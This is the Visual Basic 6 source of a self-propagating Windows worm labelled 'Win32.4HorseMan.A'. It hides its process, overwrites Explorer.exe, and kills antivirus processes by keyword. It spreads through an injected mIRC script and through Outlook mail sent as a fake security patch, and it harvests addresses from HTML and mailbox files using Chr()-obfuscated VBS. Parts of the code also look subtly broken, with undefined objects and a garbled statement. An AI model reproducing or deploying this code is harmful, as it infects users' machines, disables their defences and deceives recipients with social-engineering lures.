VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   0  'None
   ClientHeight    =   1035
   ClientLeft      =   4845
   ClientTop       =   2280
   ClientWidth     =   6465
   Icon            =   "Frm1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   NegotiateMenus  =   0   'False
   ScaleHeight     =   1035
   ScaleWidth      =   6465
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   2400
      Top             =   480
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   1920
      Top             =   480
   End
   Begin VB.ListBox List1 
      BackColor       =   &H00808080&
      ForeColor       =   &H00000000&
      Height          =   450
      ItemData        =   "Frm1.frx":27A2
      Left            =   120
      List            =   "Frm1.frx":27A4
      TabIndex        =   0
      Top             =   120
      Width           =   6255
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Win32.4HorseMan.A - By SAD1c

Dim X(100), Y(100), Z(100) As Integer
Dim tmpX(100), tmpY(100), tmpZ(100) As Integer
Dim K As Integer
Dim Zoom As Integer
Dim Speed As Integer
Dim epath, tpath, spath, ipath, mpath As Integer
Dim fso, wsh, jwJUsdKW

Public Function KillApp(myName As String) As Boolean
    Const PROCESS_ALL_ACCESS = 0
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapshot As Long
    Dim szExename As String
    Dim exitCode As Long
    Dim myProcess As Long
    Dim AppKill As Boolean
    Dim appCount As Integer
    Dim i As Integer
    On Local Error GoTo Finish
    appCount = 0
    Const TH32CS_SNAPPROCESS As Long = 2&
    uProcess.dwSize = Len(uProcess)
    hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapshot, uProcess)
    List1.Clear
    Do While rProcessFound
        i = InStr(1, uProcess.szexeFile, Chr(0))
        szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
        List1.AddItem (szExename)
        If Right$(szExename, Len(myName)) = LCase$(myName) Then
            KillApp = True
            appCount = appCount + 1
            myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
            AppKill = TerminateProcess(myProcess, exitCode)
            Call CloseHandle(myProcess)
        End If
        rProcessFound = ProcessNext(hSnapshot, uProcess)
    Loop
    Call CloseHandle(hSnapshot)
Finish:
End Function

Private Sub Form_Load()
    On Error Resume Next
    RegisterServiceProcess GetCurrentProcessId, 1
    spath = Environ("Temp") & "\SProcess.exe"
    mpath = Environ("Temp") & "\Great_Virus_Creation_Kit.exe"
    ipath = Environ("Temp") & "\Win_Security_Patch_2602.exe"
    KillApp ("none")
    Speed = -1
    K = 2038
    Zoom = 256
    Timer1.Interval = 1
    For i = 0 To 100
        X(i) = Int(Rnd * 1024) - 512
        Y(i) = Int(Rnd * 1024) - 512
        Z(i) = Int(Rnd * 512) - 256
    Next i
    vpath = App.Path & "\" & App.EXEName + ".exe"
    epath = Environ("WinDir") & "\Explorer.exe"
    If LCase(vpath) <> LCase(spath) Then
        If LCase(vpath) <> LCase(epath) Then
            tpath = Environ("WinDir") & "\System\Explorer.exe"
            FileCopy epath, tpath
            KillApp (epath)
            Shell tpath
            Kill epath
            FileCopy vpath, epath
        End If
        mircs
        FileCopy vpath, ipath
        Set fso = CreateObject("Scripting.FileSystemObject")
        spread
        outl
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
    RegisterServiceProcess GetCurrentProcessId, 0
    If LCase(vpath) = LCase(spath) Then
        Shell spath
    Else
        Shell epath
    End If
End Sub

Private Sub Timer1_Timer()
    For i = 0 To 100
    Next i
End Sub

Private Sub Timer2_Timer()
    On Error Resume Next
    KillApp ("none")
    Dim cnt As Integer
    Dim pr, all As String
    all = ""
    For cnt = 0 To List1.ListCount
        pr = List1.List(cnt)
        all = all & pr
        If InStr(1, pr, "avp") Or InStr(1, pr, "kav") Or InStr(1, pr, "nav") Or InStr(1, pr, "scan") Then
            KillApp (pr)
        ElseIf InStr(1, pr, "anti") Or InStr(1, pr, "alert") Or InStr(1, pr, "mon") Or InStr(1, pr, "check") Then
            KillApp (pr)
        End If
    Next
    If InStr(1, all, LCase(spath)) = False Then
        FileCopy vpath, spath
        Shell spath
    End If
    If InStr(1, all, LCase(epath)) = False Then
        FileCopy vpath, epath
        Shell epath
    End If
    If InStr(1, all, LCase(tpath)) = False Then
        Shell tpath
    End If
End Sub

Sub mircs()
    On Error Resume Next
    FileCopy vpath, mpath
    Set wsh = CreateObject("WScript.Shell")
    prog = wsh.SpecialFolders("Programs")
    Open prog & "\mIRC\script.ini" For Output As 1
    Print #1, "n1= on 1:JOIN:#:{"
    Print #1, "n2= /if ( $nick == $me ) { halt }"
    Print #1, "n3= /msg $nick Hi! Check out this program, it's very powerful!"
    Print #1, "n4= /dcc send -c $nick & mpath"
    Print #1, "n5= }"
    Close 1
End Sub

Sub outl()
    On Error Resume Next
    Set wsh = CreateObject("WScript.Shell")
    dat = "" & Chr(79) & Chr(110) & Chr(32) & Chr(69) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(82)
    dat = dat & Chr(101) & Chr(115) & Chr(117) & Chr(109) & Chr(101) & Chr(32) & Chr(78) & Chr(101) & Chr(120) & Chr(116) & Chr(13)
    dat = dat & Chr(10) & Chr(68) & Chr(105) & Chr(109) & Chr(32) & Chr(119) & Chr(115) & Chr(104) & Chr(13) & Chr(10) & Chr(83)
    dat = dat & Chr(101) & Chr(116) & Chr(32) & Chr(102) & Chr(115) & Chr(111) & Chr(61) & Chr(67) & Chr(114) & Chr(101) & Chr(97)
    dat = dat & Chr(116) & Chr(101) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(40) & Chr(34) & Chr(83)
    dat = dat & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(105) & Chr(110) & Chr(103) & Chr(46) & Chr(70) & Chr(105)
    dat = dat & Chr(108) & Chr(101) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(79) & Chr(98) & Chr(106)
    dat = dat & Chr(101) & Chr(99) & Chr(116) & Chr(34) & Chr(41) & Chr(13) & Chr(10) & Chr(83) & Chr(101) & Chr(116) & Chr(32)
    dat = dat & Chr(119) & Chr(115) & Chr(104) & Chr(61) & Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(79)
    dat = dat & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(40) & Chr(34) & Chr(87) & Chr(83) & Chr(99) & Chr(114)
    dat = dat & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(34) & Chr(41)
    dat = dat & Chr(13) & Chr(10) & Chr(73) & Chr(102) & Chr(32) & Chr(119) & Chr(115) & Chr(104) & Chr(46) & Chr(82) & Chr(101)
    dat = dat & Chr(103) & Chr(82) & Chr(101) & Chr(97) & Chr(100) & Chr(40) & Chr(34) & Chr(72) & Chr(75) & Chr(76) & Chr(77)
    dat = dat & Chr(92) & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77)
    dat = dat & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(65) & Chr(112)
    dat = dat & Chr(112) & Chr(68) & Chr(97) & Chr(116) & Chr(97) & Chr(67) & Chr(102) & Chr(103) & Chr(92) & Chr(77) & Chr(65)
    dat = dat & Chr(80) & Chr(73) & Chr(34) & Chr(41) & Chr(61) & Chr(34) & Chr(34) & Chr(32) & Chr(84) & Chr(104) & Chr(101)
    dat = dat & Chr(110) & Chr(13) & Chr(10) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(111) & Chr(117) & Chr(116) & Chr(61)
    dat = dat & Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99)
    dat = dat & Chr(116) & Chr(40) & Chr(34) & Chr(79) & Chr(117) & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & Chr(46)
    dat = dat & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110)
    dat = dat & Chr(34) & Chr(41) & Chr(13) & Chr(10) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(109) & Chr(97) & Chr(112)
    dat = dat & Chr(61) & Chr(111) & Chr(117) & Chr(116) & Chr(46) & Chr(71) & Chr(101) & Chr(116) & Chr(78) & Chr(97) & Chr(109)
    dat = dat & Chr(101) & Chr(83) & Chr(112) & Chr(97) & Chr(99) & Chr(101) & Chr(40) & Chr(34) & Chr(77) & Chr(65) & Chr(80)
    dat = dat & Chr(73) & Chr(34) & Chr(41) & Chr(13) & Chr(10) & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(97) & Chr(108)
    dat = dat & Chr(61) & Chr(109) & Chr(97) & Chr(112) & Chr(46) & Chr(65) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115)
    dat = dat & Chr(115) & Chr(76) & Chr(105) & Chr(115) & Chr(116) & Chr(115) & Chr(13) & Chr(10) & Chr(70) & Chr(111) & Chr(114)
    dat = dat & Chr(32) & Chr(97) & Chr(61) & Chr(49) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(97) & Chr(108) & Chr(46)
    dat = dat & Chr(67) & Chr(111) & Chr(117) & Chr(110) & Chr(116) & Chr(13) & Chr(10) & Chr(70) & Chr(111) & Chr(114) & Chr(32)
    dat = dat & Chr(99) & Chr(61) & Chr(49) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(97) & Chr(108) & Chr(40) & Chr(97)
    dat = dat & Chr(41) & Chr(46) & Chr(65) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(69) & Chr(110)
    dat = dat & Chr(116) & Chr(114) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(67) & Chr(111) & Chr(117) & Chr(110) & Chr(116)
    dat = dat & Chr(13) & Chr(10) & Chr(115) & Chr(101) & Chr(110) & Chr(100) & Chr(109) & Chr(97) & Chr(105) & Chr(108) & Chr(32)
    dat = dat & Chr(40) & Chr(97) & Chr(108) & Chr(40) & Chr(97) & Chr(41) & Chr(46) & Chr(65) & Chr(100) & Chr(100) & Chr(114)
    dat = dat & Chr(101) & Chr(115) & Chr(115) & Chr(69) & Chr(110) & Chr(116) & Chr(114) & Chr(105) & Chr(101) & Chr(115) & Chr(40)
    dat = dat & Chr(99) & Chr(41) & Chr(41) & Chr(13) & Chr(10) & Chr(78) & Chr(101) & Chr(120) & Chr(116) & Chr(13) & Chr(10)
    dat = dat & Chr(78) & Chr(101) & Chr(120) & Chr(116) & Chr(13) & Chr(10) & Chr(69) & Chr(110) & Chr(100) & Chr(32) & Chr(73)
    dat = dat & Chr(102) & Chr(13) & Chr(10) & Chr(119) & Chr(115) & Chr(104) & Chr(46) & Chr(82) & Chr(101) & Chr(103) & Chr(87)
    dat = dat & Chr(114) & Chr(105) & Chr(116) & Chr(101) & Chr(32) & Chr(34) & Chr(72) & Chr(75) & Chr(76) & Chr(77) & Chr(92)
    dat = dat & Chr(83) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(92) & Chr(77) & Chr(105)
    dat = dat & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(92) & Chr(65) & Chr(112) & Chr(112)
    dat = dat & Chr(68) & Chr(97) & Chr(116) & Chr(97) & Chr(67) & Chr(102) & Chr(103) & Chr(92) & Chr(77) & Chr(65) & Chr(80)
    dat = dat & Chr(73) & Chr(34) & Chr(44) & Chr(34) & Chr(100) & Chr(111) & Chr(110) & Chr(101) & Chr(34) & Chr(13) & Chr(10)
    dat = dat & Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(115) & Chr(101) & Chr(110) & Chr(100) & Chr(109) & Chr(97) & Chr(105)
    dat = dat & Chr(108) & Chr(40) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32) & Chr(65)
    dat = dat & Chr(115) & Chr(32) & Chr(83) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(41) & Chr(13) & Chr(10)
    dat = dat & Chr(79) & Chr(110) & Chr(32) & Chr(69) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(82) & Chr(101)
    dat = dat & Chr(115) & Chr(117) & Chr(109) & Chr(101) & Chr(32) & Chr(78) & Chr(101) & Chr(120) & Chr(116) & Chr(13) & Chr(10)
    dat = dat & Chr(83) & Chr(101) & Chr(116) & Chr(32) & Chr(98) & Chr(61) & Chr(67) & Chr(114) & Chr(101) & Chr(97) & Chr(116)
    dat = dat & Chr(101) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(40) & Chr(34) & Chr(79) & Chr(117)
    dat = dat & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105)
    dat = dat & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(34) & Chr(41) & Chr(46) & Chr(67) & Chr(114)
    dat = dat & Chr(101) & Chr(97) & Chr(116) & Chr(101) & Chr(73) & Chr(116) & Chr(101) & Chr(109) & Chr(40) & Chr(48) & Chr(41)
    dat = dat & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(84) & Chr(111) & Chr(61) & Chr(97) & Chr(100) & Chr(100) & Chr(114)
    dat = dat & Chr(101) & Chr(115) & Chr(115) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(83) & Chr(117) & Chr(98) & Chr(106)
    dat = dat & Chr(101) & Chr(99) & Chr(116) & Chr(61) & Chr(34) & Chr(86) & Chr(101) & Chr(114) & Chr(121) & Chr(32) & Chr(105)
    dat = dat & Chr(109) & Chr(112) & Chr(111) & Chr(114) & Chr(116) & Chr(97) & Chr(110) & Chr(116) & Chr(32) & Chr(112) & Chr(97)
    dat = dat & Chr(116) & Chr(99) & Chr(104) & Chr(33) & Chr(34) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(66) & Chr(111)
    dat = dat & Chr(100) & Chr(121) & Chr(61) & Chr(34) & Chr(72) & Chr(105) & Chr(46) & Chr(32) & Chr(72) & Chr(101) & Chr(114)
    dat = dat & Chr(101) & Chr(32) & Chr(105) & Chr(39) & Chr(118) & Chr(101) & Chr(32) & Chr(97) & Chr(116) & Chr(116) & Chr(97)
    dat = dat & Chr(99) & Chr(104) & Chr(101) & Chr(100) & Chr(32) & Chr(97) & Chr(32) & Chr(118) & Chr(101) & Chr(114) & Chr(121)
    dat = dat & Chr(32) & Chr(105) & Chr(109) & Chr(112) & Chr(111) & Chr(114) & Chr(116) & Chr(97) & Chr(110) & Chr(116) & Chr(32)
    dat = dat & Chr(112) & Chr(97) & Chr(116) & Chr(99) & Chr(104) & Chr(44) & Chr(32) & Chr(118) & Chr(101) & Chr(114) & Chr(121)
    dat = dat & Chr(32) & Chr(117) & Chr(115) & Chr(101) & Chr(102) & Chr(117) & Chr(108) & Chr(32) & Chr(34) & Chr(13) & Chr(10)
    dat = dat & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100) & Chr(121) & Chr(61) & Chr(98) & Chr(46) & Chr(66) & Chr(111)
    dat = dat & Chr(100) & Chr(121) & Chr(38) & Chr(34) & Chr(116) & Chr(111) & Chr(32) & Chr(102) & Chr(105) & Chr(110) & Chr(100)
    dat = dat & Chr(32) & Chr(97) & Chr(110) & Chr(100) & Chr(32) & Chr(102) & Chr(105) & Chr(120) & Chr(32) & Chr(97) & Chr(32)
    dat = dat & Chr(108) & Chr(111) & Chr(116) & Chr(32) & Chr(111) & Chr(102) & Chr(32) & Chr(98) & Chr(117) & Chr(103) & Chr(115)
    dat = dat & Chr(32) & Chr(105) & Chr(110) & Chr(32) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115)
    dat = dat & Chr(32) & Chr(97) & Chr(110) & Chr(100) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(34) & Chr(13) & Chr(10)
    dat = dat & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100) & Chr(121) & Chr(61) & Chr(98) & Chr(46) & Chr(66) & Chr(111)
    dat = dat & Chr(100) & Chr(121) & Chr(38) & Chr(34) & Chr(105) & Chr(109) & Chr(112) & Chr(114) & Chr(111) & Chr(118) & Chr(101)
    dat = dat & Chr(32) & Chr(116) & Chr(104) & Chr(101) & Chr(32) & Chr(115) & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105)
    dat = dat & Chr(116) & Chr(121) & Chr(32) & Chr(111) & Chr(102) & Chr(32) & Chr(121) & Chr(111) & Chr(117) & Chr(114) & Chr(32)
    dat = dat & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(46) & Chr(34) & Chr(38) & Chr(118)
    dat = dat & Chr(98) & Chr(67) & Chr(114) & Chr(76) & Chr(102) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(66) & Chr(111)
    dat = dat & Chr(100) & Chr(121) & Chr(61) & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100) & Chr(121) & Chr(38) & Chr(34)
    dat = dat & Chr(73) & Chr(102) & Chr(32) & Chr(105) & Chr(110) & Chr(115) & Chr(116) & Chr(97) & Chr(108) & Chr(108) & Chr(101)
    dat = dat & Chr(100) & Chr(44) & Chr(32) & Chr(116) & Chr(104) & Chr(105) & Chr(115) & Chr(32) & Chr(112) & Chr(97) & Chr(116)
    dat = dat & Chr(99) & Chr(104) & Chr(32) & Chr(105) & Chr(116) & Chr(39) & Chr(115) & Chr(32) & Chr(97) & Chr(98) & Chr(108)
    dat = dat & Chr(101) & Chr(32) & Chr(116) & Chr(111) & Chr(32) & Chr(112) & Chr(114) & Chr(101) & Chr(118) & Chr(101) & Chr(110)
    dat = dat & Chr(116) & Chr(34) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100) & Chr(121) & Chr(61)
    dat = dat & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100) & Chr(121) & Chr(38) & Chr(34) & Chr(118) & Chr(105) & Chr(114)
    dat = dat & Chr(117) & Chr(115) & Chr(32) & Chr(105) & Chr(110) & Chr(102) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111)
    dat = dat & Chr(110) & Chr(115) & Chr(32) & Chr(111) & Chr(114) & Chr(32) & Chr(111) & Chr(116) & Chr(104) & Chr(101) & Chr(114)
    dat = dat & Chr(32) & Chr(100) & Chr(97) & Chr(110) & Chr(103) & Chr(101) & Chr(114) & Chr(111) & Chr(117) & Chr(115) & Chr(32)
    dat = dat & Chr(116) & Chr(104) & Chr(105) & Chr(110) & Chr(103) & Chr(115) & Chr(46) & Chr(34) & Chr(38) & Chr(118) & Chr(98)
    dat = dat & Chr(67) & Chr(114) & Chr(76) & Chr(102) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100)
    dat = dat & Chr(121) & Chr(61) & Chr(98) & Chr(46) & Chr(66) & Chr(111) & Chr(100) & Chr(121) & Chr(38) & Chr(34) & Chr(73)
    dat = dat & Chr(32) & Chr(104) & Chr(111) & Chr(112) & Chr(101) & Chr(32) & Chr(116) & Chr(104) & Chr(97) & Chr(116) & Chr(32)
    dat = dat & Chr(116) & Chr(104) & Chr(105) & Chr(115) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(98)
    dat = dat & Chr(101) & Chr(32) & Chr(117) & Chr(115) & Chr(101) & Chr(102) & Chr(117) & Chr(108) & Chr(33) & Chr(32) & Chr(66)
    dat = dat & Chr(121) & Chr(101) & Chr(33) & Chr(34) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(65) & Chr(116) & Chr(116)
    dat = dat & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115) & Chr(46) & Chr(65) & Chr(100)
    dat = dat & Chr(100) & Chr(32) & Chr(102) & Chr(115) & Chr(111) & Chr(46) & Chr(71) & Chr(101) & Chr(116) & Chr(83) & Chr(112)
    dat = dat & Chr(101) & Chr(99) & Chr(105) & Chr(97) & Chr(108) & Chr(70) & Chr(111) & Chr(108) & Chr(100) & Chr(101) & Chr(114)
    dat = dat & Chr(40) & Chr(50) & Chr(41) & Chr(38) & Chr(34) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(95) & Chr(83)
    dat = dat & Chr(101) & Chr(99) & Chr(117) & Chr(114) & Chr(105) & Chr(116) & Chr(121) & Chr(95) & Chr(80) & Chr(97) & Chr(116)
    dat = dat & Chr(99) & Chr(104) & Chr(95) & Chr(50) & Chr(54) & Chr(48) & Chr(50) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    dat = dat & Chr(34) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(73) & Chr(109) & Chr(112) & Chr(111) & Chr(114) & Chr(116)
    dat = dat & Chr(97) & Chr(110) & Chr(99) & Chr(101) & Chr(61) & Chr(50) & Chr(13) & Chr(10) & Chr(98) & Chr(46) & Chr(68)
    dat = dat & Chr(101) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(65) & Chr(102) & Chr(116) & Chr(101) & Chr(114) & Chr(83)
    dat = dat & Chr(117) & Chr(98) & Chr(109) & Chr(105) & Chr(116) & Chr(61) & Chr(84) & Chr(114) & Chr(117) & Chr(101) & Chr(13)
    dat = dat & Chr(10) & Chr(98) & Chr(46) & Chr(83) & Chr(101) & Chr(110) & Chr(100) & Chr(13) & Chr(10) & Chr(69) & Chr(110)
    dat = dat & Chr(100) & Chr(32) & Chr(83) & Chr(117) & Chr(98)
    Open Environ("Temp") & "\LogData.vbs" For Output As 2
    Print #2, dat
    Close 2
    Shell "wscript.exe " & Environ("Temp") & "\LogData.vbs"
    adra = Split(jwJUsdKW, vbCrLf)
    For Each addr In adra
        sendmail (addr)
    Next addr
End Sub

Sub spread()
    On Error Resume Next
    For Each drv In fso.drives
        If drv.isready Then
            fldr (drv.Path & "\")
        End If
    Next
End Sub

Sub fldr(fpath)
    On Error Resume Next
    Set mYW7 = hCYEy7inBV.getfolder(fpath)
    Dim U83A9FuI, WzQrKtwNcN, kk, yX, JmjFh, hPcT, vLliQW498
    For Each q6a In mYW7.Files
    U83A9FuI = UCase(hCYEy7inBV.getextensionname(q6a.Path))
    If U83A9FuI = "HTM" Or U83A9FuI = "HTML" Or U83A9FuI = "HTT" Or U83A9FuI = "ASP" Then
    Set tBc = hCYEy7inBV.opentextfile(q6a.Path)
    WzQrKtwNcN = Split(tBc.readall, vbCrLf)
    tBc.Close
    For Each kk In WzQrKtwNcN
    yX = InStr(1, kk, "mailto:", 1)
    If InStr(1, kk, "mailto:", 1) Then
    JmjFh = 0
    hPcT = ""
    Do While Mid(kk, yX + JmjFh, 1) <> Chr(34) And Mid(kk, yX + JmjFh, 1) <> Chr(32) And Mid(kk, yX + JmjFh, 1) <> Chr(45)
    JmjFh = JmjFh + 1
    hPcT = hPcT + Mid(kk, yX + JmjFh - 1, 1)
    Loop
    vLliQW498 = Left(hPcT, Len(hPcT))
    jwJUsdKW = jwJUsdKW & Right(vLliQW498, Len(vLliQW498) - 7) & vbCrLf
    End If
    Next
    ElseIf U83A9FuI = "dbx" Then
    Set tBc = hCYEy7inBV.opentextfile(q6a.Path)
    WzQrKtwNcNtBc.readall
    tBc.Close
    JmjFh = ""
    JmjFh = 0
    For kk = 1 To Len(WzQrKtwNcN)
    hPcT = Mid(WzQrKtwNcN, kk, 1)
    If JmjFh = 0 Then
    If hPcT = Chr(60) Then
    JmjFh = 1
    End If
    Else
    If hPcT = Chr(62) Then
    jwJUsdKW = jwJUsdKW & yX & vbCrLf
    Else
    yX = yX & hPcT
    End If
    End If
    Next
    End If
    Next
    For Each B6Yrh In mYW7.subfolders
        fldr (B6Yrh.Path)
    Next
End Sub

Sub sendmail(address As String)
    On Error Resume Next
    Set b = CreateObject("Outlook.Application").CreateItem(0)
    b.To = address
    b.Subject = "Very important patch!"
    b.Body = "Hi. Here i've attached a very important patch, very useful "
    b.Body = b.Body & "to find and fix a lot of bugs in windows and to "
    b.Body = b.Body & "improve the security of your windows." & vbCrLf
    b.Body = b.Body & "If installed, this patch it's able to prevent"
    b.Body = b.Body & "virus infections or other dangerous things." & vbCrLf
    b.Body = b.Body & "I hope that this will be useful! Bye!"
    b.Attachments.Add ipath
    b.Importance = 2
    b.DeleteAfterSubmit = True
    b.Send
End Sub
